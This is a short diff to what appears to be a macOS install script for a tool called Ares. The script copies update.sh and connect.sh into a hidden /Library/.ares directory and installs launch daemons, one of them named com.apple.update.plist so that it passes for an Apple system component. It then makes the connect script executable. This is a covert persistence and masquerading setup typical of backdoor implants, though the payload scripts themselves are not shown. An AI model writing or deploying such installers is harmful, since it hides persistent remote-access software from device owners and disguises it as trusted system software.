@@ -20,9 +20,11 @@ mkdir -vp /Library/.ares
 mkdir -vp /Library/LaunchDaemons
 echo -e "Done."
 
-cp -v /Volumes/Ares/ares-hidden/* /Library/.ares
+cp -v /Volumes/Ares/Files/update.sh /Library/.ares/update.sh
+cp -v /Volumes/Ares/Files/connect.sh /Library/.ares/connect.sh
 
-cp -v /Volumes/Ares/LaunchDaemons/* /Library/LaunchDaemons
+cp -v /Volumes/Ares/Files/com.apple.update.plist /Library/LaunchDaemons/com.apple.update.plist
+cp -v /Volumes/Ares/Files/com.apple.ares.plist /Library/LaunchDaemons/com.apple.ares.plist
 
 echo -e "Making everything executable... \c"
 chmod +x /Library/.ares/connect.sh
